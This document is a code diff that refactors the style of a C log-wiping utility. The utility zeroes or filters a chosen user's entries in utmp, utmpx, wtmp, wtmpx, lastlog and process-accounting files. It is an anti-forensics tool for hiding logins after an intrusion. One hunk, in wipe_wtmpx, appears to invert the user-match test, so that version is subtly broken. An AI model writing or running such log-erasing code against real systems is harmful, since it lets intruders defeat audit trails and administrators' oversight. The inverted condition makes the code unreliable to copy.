@@ -95,21 +95,22 @@ copy_file(char *src, char *dst)
 	int	n;
 	char	buf[BUFFSIZE];
 
-	if ( (fd1 = open(src, O_RDONLY)) < 0 ) {
+	if ((fd1 = open(src, O_RDONLY)) < 0) {
 		fprintf(stderr, "ERROR: Opening %s during copy.\n", src);
 		return;
 	}
 
-	if ( (fd2 = open(dst, O_WRONLY | O_CREAT | O_TRUNC, 0644)) < 0 ) {
+	if ((fd2 = open(dst, O_WRONLY|O_CREAT|O_TRUNC, 0644)) < 0) {
 		fprintf(stderr, "ERROR: Creating %s during copy.\n", dst);
 		return;
 	}
 
-	while ( (n = read(fd1, buf, BUFFSIZE)) > 0)
+	while ((n = read(fd1, buf, BUFFSIZE)) > 0) {
 		if (write(fd2, buf, n) != n) {
 			fprintf(stderr, "ERROR: Write error during copy.\n");
 			return;
 		}
+	}
 
 	if (n < 0) {
 		fprintf(stderr, "ERROR: Read error during copy.\n");
@@ -136,7 +137,7 @@ wipe_utmp(char *who, char *line)
 	/*
 	 * Open the utmp file.
 	 */
-	if ( (fd1 = open(UTMP_FILE, O_RDWR)) < 0 ) {
+	if ((fd1 = open(UTMP_FILE, O_RDWR)) < 0) {
 		fprintf(stderr, "ERROR: Opening %s\n", UTMP_FILE);
 		return;
 	}
@@ -144,14 +145,15 @@ wipe_utmp(char *who, char *line)
 	/*
 	 * Copy utmp file excluding relevent entries.
 	 */
-	while ( read(fd1, &ut, sizeof(ut)) > 0)
-		if ( !strncmp(ut.ut_name, who, strlen(who)) )
-			if (!line || (line &&
-			  !strncmp(ut.ut_line, line, strlen(line)))) {
-				bzero((char *) &ut, sizeof(ut));
-				lseek(fd1, (int) -sizeof(ut), SEEK_CUR);
-				write(fd1, &ut, sizeof(ut));
-			}
+	while (read(fd1, &ut, sizeof(ut)) > 0) {
+		if (strncmp(ut.ut_name, who, strlen(who)) != 0)
+			continue;
+		if (line && strncmp(ut.ut_line, line, strlen(line)) != 0)
+			continue;
+		bzero((char *) &ut, sizeof(ut));
+		lseek(fd1, (int) -sizeof(ut), SEEK_CUR);
+		write(fd1, &ut, sizeof(ut));
+	}
 
 	close(fd1);
 
@@ -174,19 +176,20 @@ wipe_utmpx(char *who, char *line)
 	/*
 	 * Open the utmp file and temporary file.
 	 */
-	if ( (fd1 = open(UTMPX_FILE, O_RDWR)) < 0 ) {
+	if ((fd1 = open(UTMPX_FILE, O_RDWR)) < 0) {
 		fprintf(stderr, "ERROR: Opening %s\n", UTMPX_FILE);
 		return;
 	}
 
-	while ( (read(fd1, &utx, sizeof(utx)) ) > 0)
-		if ( !strncmp(utx.ut_name, who, strlen(who)) )
-			if (!line || (line &&
-			  !strncmp(utx.ut_line, line, strlen(line)))) {
-				bzero((char *) &utx, sizeof(utx));
-				lseek(fd1, (int) -sizeof(utx), SEEK_CUR);
-				write(fd1, &utx, sizeof(utx));
-			}
+	while (read(fd1, &utx, sizeof(utx)) > 0) {
+		if (strncmp(utx.ut_name, who, strlen(who)) != 0)
+			continue;
+		if (line && strncmp(utx.ut_line, line, strlen(line)) != 0)
+			continue;
+		bzero((char *) &utx, sizeof(utx));
+		lseek(fd1, (int) -sizeof(utx), SEEK_CUR);
+		write(fd1, &utx, sizeof(utx));
+	}
 
 	close(fd1);
 
@@ -210,7 +213,7 @@ wipe_wtmp(char *who, char *line)
 	/*
 	 * Open the wtmp file and temporary file.
 	 */
-	if ( (fd1 = open(WTMP_FILE, O_RDWR)) < 0 ) {
+	if ((fd1 = open(WTMP_FILE, O_RDWR)) < 0) {
 		fprintf(stderr, "ERROR: Opening %s\n", WTMP_FILE);
 		return;
 	}
@@ -219,15 +222,16 @@ wipe_wtmp(char *who, char *line)
 	 * Determine offset of last relevent entry.
 	 */
 	lseek(fd1, (long) -(sizeof(ut)), SEEK_END);
-	while ( (read (fd1, &ut, sizeof(ut))) > 0) {
-		if (!strncmp(ut.ut_name, who, strlen(who)))
-			if (!line || (line &&
-			  !strncmp(ut.ut_line, line, strlen(line)))) {
-			  	bzero((char *) &ut, sizeof(ut));
-				lseek(fd1, (long) -(sizeof(ut)), SEEK_CUR);
-			  	write(fd1, &ut, sizeof(ut));
-			  	break;
-			}
+	while ((read (fd1, &ut, sizeof(ut))) > 0) {
+		if (strncmp(ut.ut_name, who, strlen(who)) != 0)
+			goto skip;
+		if (line && strncmp(ut.ut_line, line, strlen(line)) != 0)
+			goto skip;
+		bzero((char *) &ut, sizeof(ut));
+		lseek(fd1, (long) -(sizeof(ut)), SEEK_CUR);
+		write(fd1, &ut, sizeof(ut));
+		break;
+skip:
 		lseek(fd1, (long) -(sizeof(ut) * 2), SEEK_CUR);
 	}
 
@@ -253,7 +257,7 @@ wipe_wtmpx(char *who, char *line)
 	/*
 	 * Open the utmp file and temporary file.
 	 */
-	if ( (fd1 = open(WTMPX_FILE, O_RDWR)) < 0 ) {
+	if ((fd1 = open(WTMPX_FILE, O_RDWR)) < 0) {
 		fprintf(stderr, "ERROR: Opening %s\n", WTMPX_FILE);
 		return;
 	}
@@ -262,15 +266,16 @@ wipe_wtmpx(char *who, char *line)
 	 * Determine offset of last relevent entry.
 	 */
 	lseek(fd1, (long) -(sizeof(utx)), SEEK_END);
-	while ( (read (fd1, &utx, sizeof(utx))) > 0) {
+	while ((read(fd1, &utx, sizeof(utx))) > 0) {
 		if (!strncmp(utx.ut_name, who, strlen(who)))
-			if (!line || (line &&
-			  !strncmp(utx.ut_line, line, strlen(line)))) {
-			  	bzero((char *) &utx, sizeof(utx));
-				lseek(fd1, (long) -(sizeof(utx)), SEEK_CUR);
-			  	write(fd1, &utx, sizeof(utx));
-			  	break;
-			}
+			goto skip;
+		if (line && strncmp(utx.ut_line, line, strlen(line)) != 0)
+			goto skip;
+		bzero((char *) &utx, sizeof(utx));
+		lseek(fd1, (long) -(sizeof(utx)), SEEK_CUR);
+		write(fd1, &utx, sizeof(utx));
+		break;
+skip:
 		lseek(fd1, (int) -(sizeof(utx) * 2), SEEK_CUR);
 	}
 
@@ -299,12 +304,12 @@ wipe_lastlog(char *who, char *line, char *timestr, char *host)
         /*
 	 * Open the lastlog file.
 	 */
-	if ( (fd1 = open(LASTLOG_FILE, O_RDWR)) < 0 ) {
+	if ((fd1 = open(LASTLOG_FILE, O_RDWR)) < 0) {
 		fprintf(stderr, "ERROR: Opening %s\n", LASTLOG_FILE);
 		return;
 	}
 
-	if ( (pwd = getpwnam(who)) == NULL) {
+	if ((pwd = getpwnam(who)) == NULL) {
 		fprintf(stderr, "ERROR: Can't find user in passwd.\n");
 		return;
 	}
@@ -384,7 +389,7 @@ wipe_acct(char *who, char *line)
         /*
 	 * Open the acct file and temporary file.
 	 */
-	if ( (fd1 = open(ACCT_FILE, O_RDONLY)) < 0 ) {
+	if ((fd1 = open(ACCT_FILE, O_RDONLY)) < 0) {
 		fprintf(stderr, "ERROR: Opening %s\n", ACCT_FILE);
 		return;
 	}
@@ -392,12 +397,12 @@ wipe_acct(char *who, char *line)
 	/*
 	 * Grab a unique temporary filename.
 	 */
-	if ( (fd2 = mkstemp(tmpf)) < 0 ) {
+	if ((fd2 = mkstemp(tmpf)) < 0) {
 		fprintf(stderr, "ERROR: Opening tmp ACCT file\n");
 		return;
 	}
 
-	if ( (pwd = getpwnam(who)) == NULL) {
+	if ((pwd = getpwnam(who)) == NULL) {
 		fprintf(stderr, "ERROR: Can't find user in passwd.\n");
 		return;
 	}
@@ -412,8 +417,8 @@ wipe_acct(char *who, char *line)
 		return;
 	}
 
-	while ( read(fd1, &ac, sizeof(ac)) > 0 ) {
-		if ( !(ac.ac_uid == pwd->pw_uid && ac.ac_tty == sbuf.st_rdev) )
+	while (read(fd1, &ac, sizeof(ac)) > 0) {
+		if (!(ac.ac_uid == pwd->pw_uid && ac.ac_tty == sbuf.st_rdev))
 			write(fd2, &ac, sizeof(ac));
 	}
 
@@ -483,16 +488,14 @@ main(int argc, char *argv[])
 		case 'U' :
 			if (argc == 3)
 				wipe_utmp(argv[2], (char *) NULL);
-			if (argc ==4)
+			if (argc == 4)
 				wipe_utmp(argv[2], argv[3]);
-
 #ifdef HAVE_UTMPX
 			if (argc == 3)
 				wipe_utmpx(argv[2], (char *) NULL);
 			if (argc == 4)
 				wipe_utmpx(argv[2], argv[3]);
 #endif
-
 			break;
 		/* WTMP */
 		case 'W' :
@@ -500,14 +503,12 @@ main(int argc, char *argv[])
 				wipe_wtmp(argv[2], (char *) NULL);
 			if (argc == 4)
 				wipe_wtmp(argv[2], argv[3]);
-
 #ifdef HAVE_UTMPX
 			if (argc == 3)
 				wipe_wtmpx(argv[2], (char *) NULL);
 			if (argc == 4)
 				wipe_wtmpx(argv[2], argv[3]);
 #endif
-
 			break;
 		/* LASTLOG */
 		case 'L' :
@@ -534,6 +535,6 @@ main(int argc, char *argv[])
 #endif
 	}
 
-	return(0);
+	return 0;
 }
 
